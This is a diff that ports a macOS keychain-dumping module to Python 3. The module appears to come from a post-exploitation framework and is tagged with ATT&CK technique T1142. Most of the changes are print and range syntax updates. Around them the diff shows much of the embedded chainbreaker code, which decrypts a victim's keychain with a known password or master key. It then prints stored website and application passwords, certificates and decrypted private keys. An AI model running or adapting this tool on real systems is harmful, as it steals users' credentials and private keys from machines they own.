@@ -1,4 +1,5 @@
-class Module:
+from builtins import object
+class Module(object):
 
     def __init__(self, mainMenu, params=[]):
 
@@ -12,6 +13,10 @@ class Module:
 
             # more verbose multi-line description of the module
             'Description': ("A keychain dump module that allows for decryption via known password."),
+
+            'Software': '',
+
+            'Techniques': ['T1142'],
 
             # True if the module needs to run in the background
             'Background' : False,
@@ -442,8 +447,8 @@ from pyDes import *
 data = "Please encrypt my string"
 k = des("DESCRYPT", " ", CBC, "\0\0\0\0\0\0\0\0")
 d = k.encrypt(data)
-print "Encypted string: " + d
-print "Decypted string: " + k.decrypt(d)
+print("Encypted string: " + d)
+print("Decypted string: " + k.decrypt(d))
 
 See the module source (pyDes.py) for more examples of use.
 You can slo run the pyDes.py file without and arguments to see a simple test.
@@ -677,7 +682,7 @@ class des:
 
     def __permutate(self, table, block):
         '''Permutate this block with the specified table'''
-        return map(lambda x: block[x], table)
+        return [block[x] for x in table]
 
     # Transform the secret key, so that it is ready for data processing
     # Create the 16 subkeys, K[1] - K[16]
@@ -730,7 +735,7 @@ class des:
             self.R = self.__permutate(des.__expansion_table, self.R)
 
             # Exclusive or R[i - 1] with K[i], create B[1] to B[8] whilst here
-            self.R = map(lambda x, y: x ^ y, self.R, self.Kn[iteration])
+            self.R = list(map(lambda x, y: x ^ y, self.R, self.Kn[iteration]))
             B = [self.R[:6], self.R[6:12], self.R[12:18], self.R[18:24], self.R[24:30], self.R[30:36], self.R[36:42],
                  self.R[42:]]
             # Optimization: Replaced below commented code with above
@@ -767,7 +772,7 @@ class des:
             self.R = self.__permutate(des.__p, Bn)
 
             # Xor with L[i - 1]
-            self.R = map(lambda x, y: x ^ y, self.R, self.L)
+            self.R = list(map(lambda x, y: x ^ y, self.R, self.L))
             # Optimization: This now replaces the below commented code
             #j = 0
             #while j < len(self.R):
@@ -830,7 +835,7 @@ class des:
             # Xor with IV if using CBC mode
             if self.getMode() == CBC:
                 if crypt_type == des.ENCRYPT:
-                    block = map(lambda x, y: x ^ y, block, iv)
+                    block = list(map(lambda x, y: x ^ y, block, iv))
                 #j = 0
                 #while j < len(block):
                 #   block[j] = block[j] ^ iv[j]
@@ -839,7 +844,7 @@ class des:
                 processed_block = self.__des_crypt(block, crypt_type)
 
                 if crypt_type == des.DECRYPT:
-                    processed_block = map(lambda x, y: x ^ y, processed_block, iv)
+                    processed_block = list(map(lambda x, y: x ^ y, processed_block, iv))
                     #j = 0
                     #while j < len(processed_block):
                     #   processed_block[j] = processed_block[j] ^ iv[j]
@@ -1063,65 +1068,65 @@ def example_triple_des():
     from binascii import unhexlify as unhex
 
     # example shows triple-des encryption using the des class
-    print "Example of triple DES encryption in default ECB mode (DES-EDE3)\n"
+    print("Example of triple DES encryption in default ECB mode (DES-EDE3)\n")
 
-    print "Triple des using the des class (3 times)"
+    print("Triple des using the des class (3 times)")
     t = time()
     k1 = des(unhex("133457799BBCDFF1"))
     k2 = des(unhex("1122334455667788"))
     k3 = des(unhex("77661100DD223311"))
     d = "Triple DES test string, to be encrypted and decrypted..."
-    print "Key1:      %s" % k1.getKey()
-    print "Key2:      %s" % k2.getKey()
-    print "Key3:      %s" % k3.getKey()
-    print "Data:      %s" % d
+    print("Key1:      %s" % k1.getKey())
+    print("Key2:      %s" % k2.getKey())
+    print("Key3:      %s" % k3.getKey())
+    print("Data:      %s" % d)
 
     e1 = k1.encrypt(d)
     e2 = k2.decrypt(e1)
     e3 = k3.encrypt(e2)
-    print "Encrypted: " + e3
+    print("Encrypted: " + e3)
 
     d3 = k3.decrypt(e3)
     d2 = k2.encrypt(d3)
     d1 = k1.decrypt(d2)
-    print "Decrypted: " + d1
-    print "DES time taken: %f (%d crypt operations)" % (time() - t, 6 * (len(d) / 8))
-    print ""
+    print("Decrypted: " + d1)
+    print("DES time taken: %f (%d crypt operations)" % (time() - t, 6 * (len(d) / 8)))
+    print("")
 
     # Example below uses the triple-des class to achieve the same as above
-    print "Now using triple des class"
+    print("Now using triple des class")
     t = time()
     t1 = triple_des(unhex("133457799BBCDFF1112233445566778877661100DD223311"))
-    print "Key:       %s" % t1.getKey()
-    print "Data:      %s" % d
+    print("Key:       %s" % t1.getKey())
+    print("Data:      %s" % d)
 
     td1 = t1.encrypt(d)
-    print "Encrypted: " + td1
+    print("Encrypted: " + td1)
 
     td2 = t1.decrypt(td1)
-    print "Decrypted: " + td2
+    print("Decrypted: " + td2)
 
-    print "Triple DES time taken: %f (%d crypt operations)" % (time() - t, 6 * (len(d) / 8))
+    print("Triple DES time taken: %f (%d crypt operations)" % (time() - t, 6 * (len(d) / 8)))
 
 
 def example_des():
     from time import time
 
     # example of DES encrypting in CBC mode with the IV of "\0\0\0\0\0\0\0\0"
-    print "Example of DES encryption using CBC mode\n"
+    print("Example of DES encryption using CBC mode\n")
     t = time()
     k = des("DESCRYPT", CBC, "\0\0\0\0\0\0\0\0")
     data = "DES encryption algorithm"
-    print "Key      : " + k.getKey()
-    print "Data     : " + data
+    print("Key      : " + k.getKey())
+    print("Data     : " + data)
 
     d = k.encrypt(data)
-    print "Encrypted: " + d
+    print("Encrypted: " + d)
 
     d = k.decrypt(d)
-    print "Decrypted: " + d
-    print "DES time taken: %f (6 crypt operations)" % (time() - t)
-    print ""
+    print("Decrypted: " + d)
+    print("DES time taken: %f (6 crypt operations)" % (time() - t))
+    print("")
 
 
 def __test__():
@@ -1135,44 +1140,44 @@ def __fulltest__():
     from binascii import hexlify as dohex
 
     __test__()
-    print ""
+    print("")
 
     k = des("\0\0\0\0\0\0\0\0", CBC, "\0\0\0\0\0\0\0\0")
     d = k.encrypt("DES encryption algorithm")
     if k.decrypt(d) != "DES encryption algorithm":
-        print "Test 1 Error: Unencypted data block does not match start data"
+        print("Test 1 Error: Unencypted data block does not match start data")
 
     k = des("\0\0\0\0\0\0\0\0", CBC, "\0\0\0\0\0\0\0\0")
     d = k.encrypt("Default string of text", '*')
     if k.decrypt(d, "*") != "Default string of text":
-        print "Test 2 Error: Unencypted data block does not match start data"
+        print("Test 2 Error: Unencypted data block does not match start data")
 
     k = des("\r\n\tABC\r\n")
     d = k.encrypt("String to Pad", '*')
     if k.decrypt(d) != "String to Pad***":
-        print "'%s'" % k.decrypt(d)
-        print "Test 3 Error: Unencypted data block does not match start data"
+        print("'%s'" % k.decrypt(d))
+        print("Test 3 Error: Unencypted data block does not match start data")
 
     k = des("\r\n\tABC\r\n")
     d = k.encrypt(unhex("000102030405060708FF8FDCB04080"), unhex("44"))
     if k.decrypt(d, unhex("44")) != unhex("000102030405060708FF8FDCB04080"):
-        print "Test 4a Error: Unencypted data block does not match start data"
+        print("Test 4a Error: Unencypted data block does not match start data")
     if k.decrypt(d) != unhex("000102030405060708FF8FDCB0408044"):
-        print "Test 4b Error: Unencypted data block does not match start data"
+        print("Test 4b Error: Unencypted data block does not match start data")
 
     k = triple_des("MyDesKey\r\n\tABC\r\n0987*543")
     d = k.encrypt(unhex(
         "000102030405060708FF8FDCB04080000102030405060708FF8FDCB04080000102030405060708FF8FDCB04080000102030405060708FF8FDCB04080000102030405060708FF8FDCB04080000102030405060708FF8FDCB04080000102030405060708FF8FDCB04080000102030405060708FF8FDCB04080"))
     if k.decrypt(d) != unhex(
             "000102030405060708FF8FDCB04080000102030405060708FF8FDCB04080000102030405060708FF8FDCB04080000102030405060708FF8FDCB04080000102030405060708FF8FDCB04080000102030405060708FF8FDCB04080000102030405060708FF8FDCB04080000102030405060708FF8FDCB04080"):
-        print "Test 5 Error: Unencypted data block does not match start data"
+        print("Test 5 Error: Unencypted data block does not match start data")
 
     k = triple_des("\r\n\tABC\r\n0987*543")
     d = k.encrypt(unhex(
         "000102030405060708FF8FDCB04080000102030405060708FF8FDCB04080000102030405060708FF8FDCB04080000102030405060708FF8FDCB04080000102030405060708FF8FDCB04080000102030405060708FF8FDCB04080000102030405060708FF8FDCB04080000102030405060708FF8FDCB04080"))
     if k.decrypt(d) != unhex(
             "000102030405060708FF8FDCB04080000102030405060708FF8FDCB04080000102030405060708FF8FDCB04080000102030405060708FF8FDCB04080000102030405060708FF8FDCB04080000102030405060708FF8FDCB04080000102030405060708FF8FDCB04080000102030405060708FF8FDCB04080"):
-        print "Test 6 Error: Unencypted data block does not match start data"
+        print("Test 6 Error: Unencypted data block does not match start data")
 
 
 def __filetest__():
@@ -1194,7 +1199,7 @@ def __filetest__():
     f = open("pyDes.py.dec", "wb+")
     f.write(d)
     f.close()
-    print "DES file test time: %f" % (time() - t)
+    print("DES file test time: %f" % (time() - t))
 
 
 def __profile__():
@@ -1229,7 +1234,7 @@ def pbkdf2(password, salt, itercount, keylen, hashfn=sha):
     if keylen % BLOCKLEN != 0:
         l += 1
 
-    h = hmac.new(password, None, hashfn)
+    h = hmac.new(password, None, digestmod=hashfn)
 
     T = ""
     for i in range(1, l + 1):
@@ -1276,8 +1281,8 @@ def test():
     itercount = 500
     keylen = 16
     ret = pbkdf2(password, salt, itercount, keylen)
-    print "key:      %s" % hexlify(ret)
-    print "expected: 6A 89 70 BF 68 C9 2C AE A8 4A 8D F2 85 10 85 86"
+    print("key:      %s" % hexlify(ret))
+    print("expected: 6A 89 70 BF 68 C9 2C AE A8 4A 8D F2 85 10 85 86")
 
 
 
@@ -1320,12 +1325,12 @@ from ctypes import *
 def hexdump(src, length=16):
     FILTER = ''.join([(len(repr(chr(x))) == 3) and chr(x) or '.' for x in range(256)])
     lines = []
-    for c in xrange(0, len(src), length):
+    for c in range(0, len(src), length):
         chars = src[c:c+length]
         hex = ' '.join(["%02x" % ord(x) for x in chars])
         printable = ''.join(["%s" % ((ord(x) <= 127 and FILTER[ord(x)]) or '.') for x in chars])
         lines.append("%04x  %-*s  %s\n" % (c, length*3, hex, printable))
-    print ''.join(lines)
+    print(''.join(lines))
     
 ATOM_SIZE = 4
 SIZEOFKEYCHAINTIME = 16
@@ -1580,7 +1585,7 @@ class KeyChain():
         table_list = []
         #schema_info = struct.unpack(APPL_DB_SCHEMA, self.fbuf[offset:offset + APPL_DB_SCHEMA_SIZE])
         _schemainfo = _memcpy(self.fbuf[offset:offset+sizeof(_APPL_DB_SCHEMA)], _APPL_DB_SCHEMA)
-        for i in xrange(_schemainfo.TableCount):
+        for i in range(_schemainfo.TableCount):
             BASE_ADDR = sizeof(_APPL_DB_HEADER) + sizeof(_APPL_DB_SCHEMA)
             table_list.append(
                 struct.unpack('>I', self.fbuf[BASE_ADDR + (ATOM_SIZE * i):BASE_ADDR + (ATOM_SIZE * i) + ATOM_SIZE])[0])
@@ -1614,7 +1619,7 @@ class KeyChain():
 
     def getTablenametoList(self, recordList, tableList):
         TableDic = {}
-        for count in xrange(len(recordList)):
+        for count in range(len(recordList)):
             tableMeta, GenericList = self.getTable(tableList[count])
             TableDic[tableMeta.TableId] = count    # extract valid table list
 
@@ -1659,7 +1664,7 @@ class KeyChain():
 
         CipherLen = KeyBlobRecord.TotalLength - KeyBlobRecord.CipherOffset
         if CipherLen % BLOCKSIZE != 0:
-            print "Bad ciphertext len"
+            print("Bad ciphertext len")
 
         iv = record[16:24]
 
@@ -1833,7 +1838,7 @@ class KeyChain():
         try:
             data = struct.unpack(unpack_value, self.fbuf[BASE_ADDR + pCol + 4:BASE_ADDR + pCol + 4 + real_str_len])[0]
         except struct.error:
-            print 'Length is too long : %d'%real_str_len
+            print('Length is too long : %d'%real_str_len)
             return ''
         return data
 
@@ -1989,8 +1994,6 @@ def kcdecrypt(key, iv, data):
         return data
 
     cipher = triple_des(key, CBC, iv)
-    # the line below is for pycrypto instead
-    #cipher = DES3.new( key, DES3.MODE_CBC, iv )
 
     plain = cipher.decrypt(data)
 
@@ -2019,21 +2022,21 @@ def chainbreaker(file, password, key=''):
     group.add_argument('-p', '--password', nargs=1, help='User Password', required=False)
 
     if os.path.exists(file) is False:
-        print '[!] ERROR: Keychain is not exists'
+        print('[!] ERROR: Keychain is not exists')
         parser.print_help()
         exit()
 
     keychain = KeyChain(file)
     
     if keychain.open() is False:
-        print '[!] ERROR: %s Open Failed'%file
+        print('[!] ERROR: %s Open Failed'%file)
         parser.print_help()
         exit()
 
     KeychainHeader = keychain.getHeader()
 
     if KeychainHeader.Signature != KEYCHAIN_SIGNATURE:
-        print '[!] ERROR: Invalid Keychain Format'
+        print('[!] ERROR: Invalid Keychain Format')
         parser.print_help()
         exit()
 
@@ -2052,17 +2055,17 @@ def chainbreaker(file, password, key=''):
         dbkey = keychain.findWrappingKey(unhexlify(key), TableList[tableEnum[CSSM_DL_DB_RECORD_METADATA]])
 
     else:
-        print '[!] ERROR: password or master key candidate'
+        print('[!] ERROR: password or master key candidate')
         exit()
 
     # DEBUG
-    print ' [-] DB Key'
+    print(' [-] DB Key')
     hexdump(dbkey)
 
     key_list = {}  # keyblob list
 
     # get symmetric key blob
-    print '[+] Symmetric Key Table: 0x%.8x' % (sizeof(_APPL_DB_HEADER) + TableList[tableEnum[CSSM_DL_DB_RECORD_SYMMETRIC_KEY]])
+    print('[+] Symmetric Key Table: 0x%.8x' % (sizeof(_APPL_DB_HEADER) + TableList[tableEnum[CSSM_DL_DB_RECORD_SYMMETRIC_KEY]]))
     TableMetadata, symmetrickey_list = keychain.getTable(TableList[tableEnum[CSSM_DL_DB_RECORD_SYMMETRIC_KEY]])
 
     for symmetrickey_record in symmetrickey_list:
@@ -2078,27 +2081,27 @@ def chainbreaker(file, password, key=''):
 
         for genericpw in genericpw_list:
             record = keychain.getGenericPWRecord(TableList[tableEnum[CSSM_DL_DB_RECORD_GENERIC_PASSWORD]], genericpw)
-            print '[+] Generic Password Record'
+            print('[+] Generic Password Record')
             try:
                 real_key = key_list[record[0][0:20]]
                 passwd = keychain.DBBlobDecryption(record[0], real_key)
             except KeyError:
                 passwd = ''
-            print ' [-] Create DateTime: %s' % record[1]  # 16byte string
-            print ' [-] Last Modified DateTime: %s' % record[2]  # 16byte string
-            print ' [-] Description : %s' % record[3]
-            print ' [-] Creator : %s' % record[4]
-            print ' [-] Type : %s' % record[5]
-            print ' [-] PrintName : %s' % record[6]
-            print ' [-] Alias : %s' % record[7]
-            print ' [-] Account : %s' % record[8]
-            print ' [-] Service : %s' % record[9]
-            print ' [-] Password'
+            print(' [-] Create DateTime: %s' % record[1])  # 16byte string
+            print(' [-] Last Modified DateTime: %s' % record[2])  # 16byte string
+            print(' [-] Description : %s' % record[3])
+            print(' [-] Creator : %s' % record[4])
+            print(' [-] Type : %s' % record[5])
+            print(' [-] PrintName : %s' % record[6])
+            print(' [-] Alias : %s' % record[7])
+            print(' [-] Account : %s' % record[8])
+            print(' [-] Service : %s' % record[9])
+            print(' [-] Password')
             hexdump(passwd)
-            print ''
+            print('')
 
     except KeyError:
-        print '[!] Generic Password Table is not available'
+        print('[!] Generic Password Table is not available')
         pass
 
     try:
@@ -2106,40 +2109,40 @@ def chainbreaker(file, password, key=''):
 
         for internetpw in internetpw_list:
             record = keychain.getInternetPWRecord(TableList[tableEnum[CSSM_DL_DB_RECORD_INTERNET_PASSWORD]], internetpw)
-            print '[+] Internet Record'
+            print('[+] Internet Record')
             try:
                 real_key = key_list[record[0][0:20]]
                 passwd = keychain.DBBlobDecryption(record[0], real_key)
             except KeyError:
                 passwd = ''
-            print ' [-] Create DateTime: %s' % record[1]  # 16byte string
-            print ' [-] Last Modified DateTime: %s' % record[2]  # 16byte string
-            print ' [-] Description : %s' % record[3]
-            print ' [-] Comment : %s' % record[4]
-            print ' [-] Creator : %s' % record[5]
-            print ' [-] Type : %s' % record[6]
-            print ' [-] PrintName : %s' % record[7]
-            print ' [-] Alias : %s' % record[8]
-            print ' [-] Protected : %s' % record[9]
-            print ' [-] Account : %s' % record[10]
-            print ' [-] SecurityDomain : %s' % record[11]
-            print ' [-] Server : %s' % record[12]
+            print(' [-] Create DateTime: %s' % record[1])  # 16byte string
+            print(' [-] Last Modified DateTime: %s' % record[2])  # 16byte string
+            print(' [-] Description : %s' % record[3])
+            print(' [-] Comment : %s' % record[4])
+            print(' [-] Creator : %s' % record[5])
+            print(' [-] Type : %s' % record[6])
+            print(' [-] PrintName : %s' % record[7])
+            print(' [-] Alias : %s' % record[8])
+            print(' [-] Protected : %s' % record[9])
+            print(' [-] Account : %s' % record[10])
+            print(' [-] SecurityDomain : %s' % record[11])
+            print(' [-] Server : %s' % record[12])
             try:
-                print ' [-] Protocol Type : %s' % PROTOCOL_TYPE[record[13]]
+                print(' [-] Protocol Type : %s' % PROTOCOL_TYPE[record[13]])
             except KeyError:
-                print ' [-] Protocol Type : %s' % record[13]
+                print(' [-] Protocol Type : %s' % record[13])
             try:
-                print ' [-] Auth Type : %s' % AUTH_TYPE[record[14]]
+                print(' [-] Auth Type : %s' % AUTH_TYPE[record[14]])
             except KeyError:
-                print ' [-] Auth Type : %s' % record[14]
-            print ' [-] Port : %d' % record[15]
-            print ' [-] Path : %s' % record[16]
-            print ' [-] Password'
+                print(' [-] Auth Type : %s' % record[14])
+            print(' [-] Port : %d' % record[15])
+            print(' [-] Path : %s' % record[16])
+            print(' [-] Password')
             hexdump(passwd)
-            print ''
+            print('')
 
     except KeyError:
-        print '[!] Internet Password Table is not available'
+        print('[!] Internet Password Table is not available')
         pass
 
     try:
@@ -2147,37 +2150,37 @@ def chainbreaker(file, password, key=''):
 
         for applesharepw in applesharepw_list:
             record = keychain.getAppleshareRecord(TableList[tableEnum[CSSM_DL_DB_RECORD_APPLESHARE_PASSWORD]], applesharepw)
-            print '[+] AppleShare Record (no more used OS X)'
+            print('[+] AppleShare Record (no more used OS X)')
             try:
                 real_key = key_list[record[0][0:20]]
                 passwd = keychain.DBBlobDecryption(record[0], real_key)
             except KeyError:
                 passwd = ''
             #print ''
-            print ' [-] Create DateTime: %s' % record[1]  # 16byte string
-            print ' [-] Last Modified DateTime: %s' % record[2]  # 16byte string
-            print ' [-] Description : %s' % record[3]
-            print ' [-] Comment : %s' % record[4]
-            print ' [-] Creator : %s' % record[5]
-            print ' [-] Type : %s' % record[6]
-            print ' [-] PrintName : %s' % record[7]
-            print ' [-] Alias : %s' % record[8]
-            print ' [-] Protected : %s' % record[9]
-            print ' [-] Account : %s' % record[10]
-            print ' [-] Volume : %s' % record[11]
-            print ' [-] Server : %s' % record[12]
+            print(' [-] Create DateTime: %s' % record[1])  # 16byte string
+            print(' [-] Last Modified DateTime: %s' % record[2])  # 16byte string
+            print(' [-] Description : %s' % record[3])
+            print(' [-] Comment : %s' % record[4])
+            print(' [-] Creator : %s' % record[5])
+            print(' [-] Type : %s' % record[6])
+            print(' [-] PrintName : %s' % record[7])
+            print(' [-] Alias : %s' % record[8])
+            print(' [-] Protected : %s' % record[9])
+            print(' [-] Account : %s' % record[10])
+            print(' [-] Volume : %s' % record[11])
+            print(' [-] Server : %s' % record[12])
             try:
-                print ' [-] Protocol Type : %s' % PROTOCOL_TYPE[record[13]]
+                print(' [-] Protocol Type : %s' % PROTOCOL_TYPE[record[13]])
             except KeyError:
-                print ' [-] Protocol Type : %s' % record[13]
-            print ' [-] Address : %d' % record[14]
-            print ' [-] Signature : %s' % record[15]
-            print ' [-] Password'
+                print(' [-] Protocol Type : %s' % record[13])
+            print(' [-] Address : %d' % record[14])
+            print(' [-] Signature : %s' % record[15])
+            print(' [-] Password')
             hexdump(passwd)
-            print ''
+            print('')
 
     except KeyError:
-        print '[!] AppleShare Table is not available'
+        print('[!] AppleShare Table is not available')
         pass
 
     try:
@@ -2185,77 +2188,77 @@ def chainbreaker(file, password, key=''):
 
         for x509Cert in x509CertList:
             record = keychain.getx509Record(TableList[tableEnum[CSSM_DL_DB_RECORD_X509_CERTIFICATE]], x509Cert)
-            print ' [-] Cert Type: %s' %CERT_TYPE[record[0]]
-            print ' [-] Cert Encoding: %s' %CERT_ENCODING[record[1]]
-            print ' [-] PrintName : %s' % record[2]
-            print ' [-] Alias : %s' % record[3]
-            print ' [-] Subject'
+            print(' [-] Cert Type: %s' %CERT_TYPE[record[0]])
+            print(' [-] Cert Encoding: %s' %CERT_ENCODING[record[1]])
+            print(' [-] PrintName : %s' % record[2])
+            print(' [-] Alias : %s' % record[3])
+            print(' [-] Subject')
             hexdump(record[4])
-            print ' [-] Issuer :'
+            print(' [-] Issuer :')
             hexdump(record[5])
-            print ' [-] SerialNumber'
+            print(' [-] SerialNumber')
             hexdump(record[6])
-            print ' [-] SubjectKeyIdentifier'
+            print(' [-] SubjectKeyIdentifier')
             hexdump(record[7])
-            print ' [-] Public Key Hash'
+            print(' [-] Public Key Hash')
             hexdump(record[8])
-            print ' [-] Certificate'
+            print(' [-] Certificate')
             hexdump(record[9])
-            print ''
+            print('')
 
     except KeyError:
-        print '[!] Certification Table is not available'
+        print('[!] Certification Table is not available')
         pass
 
     try:
         TableMetadata, PublicKeyList = keychain.getTable(TableList[tableEnum[CSSM_DL_DB_RECORD_PUBLIC_KEY]])
         for PublicKey in PublicKeyList:
             record = keychain.getKeyRecord(TableList[tableEnum[CSSM_DL_DB_RECORD_PUBLIC_KEY]], PublicKey)
-            print '[+] Public Key Record'
-            print ' [-] PrintName: %s' %record[0]
-            print ' [-] Label'
+            print('[+] Public Key Record')
+            print(' [-] PrintName: %s' %record[0])
+            print(' [-] Label')
             hexdump(record[1])
-            print ' [-] Key Class : %s'%KEY_TYPE[record[2]]
-            print ' [-] Private : %d'%record[3]
-            print ' [-] Key Type : %s'%CSSM_ALGORITHMS[record[4]]
-            print ' [-] Key Size : %d bits'%record[5]
-            print ' [-] Effective Key Size : %d bits'%record[6]
-            print ' [-] Extracted : %d'%record[7]
-            print ' [-] CSSM Type : %s' %STD_APPLE_ADDIN_MODULE[record[8]]
-            print ' [-] Public Key'
+            print(' [-] Key Class : %s'%KEY_TYPE[record[2]])
+            print(' [-] Private : %d'%record[3])
+            print(' [-] Key Type : %s'%CSSM_ALGORITHMS[record[4]])
+            print(' [-] Key Size : %d bits'%record[5])
+            print(' [-] Effective Key Size : %d bits'%record[6])
+            print(' [-] Extracted : %d'%record[7])
+            print(' [-] CSSM Type : %s' %STD_APPLE_ADDIN_MODULE[record[8]])
+            print(' [-] Public Key')
             hexdump(record[10])
 
     except KeyError:
-        print '[!] Public Key Table is not available'
+        print('[!] Public Key Table is not available')
         pass
 
     try:
         table_meta, PrivateKeyList = keychain.getTable(TableList[tableEnum[CSSM_DL_DB_RECORD_PRIVATE_KEY]])
         for PrivateKey in PrivateKeyList:
             record = keychain.getKeyRecord(TableList[tableEnum[CSSM_DL_DB_RECORD_PRIVATE_KEY]], PrivateKey)
-            print '[+] Private Key Record'
-            print ' [-] PrintName: %s' % record[0]
-            print ' [-] Label'
+            print('[+] Private Key Record')
+            print(' [-] PrintName: %s' % record[0])
+            print(' [-] Label')
             hexdump(record[1])
-            print ' [-] Key Class : %s' % KEY_TYPE[record[2]]
-            print ' [-] Private : %d' % record[3]
-            print ' [-] Key Type : %s' % CSSM_ALGORITHMS[record[4]]
-            print ' [-] Key Size : %d bits' % record[5]
-            print ' [-] Effective Key Size : %d bits' % record[6]
-            print ' [-] Extracted : %d' % record[7]
-            print ' [-] CSSM Type : %s' % STD_APPLE_ADDIN_MODULE[record[8]]
+            print(' [-] Key Class : %s' % KEY_TYPE[record[2]])
+            print(' [-] Private : %d' % record[3])
+            print(' [-] Key Type : %s' % CSSM_ALGORITHMS[record[4]])
+            print(' [-] Key Size : %d bits' % record[5])
+            print(' [-] Effective Key Size : %d bits' % record[6])
+            print(' [-] Extracted : %d' % record[7])
+            print(' [-] CSSM Type : %s' % STD_APPLE_ADDIN_MODULE[record[8]])
             keyname, privatekey = keychain.PrivateKeyDecryption(record[10], record[9], dbkey)
-            print ' [-] Key Name'
+            print(' [-] Key Name')
             hexdump(keyname)
-            print ' [-] Decrypted Private Key'
+            print(' [-] Decrypted Private Key')
             hexdump(privatekey)
 
     except KeyError:
-        print '[!] Private Key Table is not available'
+        print('[!] Private Key Table is not available')
         pass
 
     exit()
-""" 
+"""
         script += """
 try:
     import gc
@@ -2263,7 +2266,7 @@ try:
     chainbreaker('%s', '%s', key='')
     gc.collect()
 except Exception as e:
-    print e 
+    print(e) 
     pass
         """ % (keyChain, password)
 
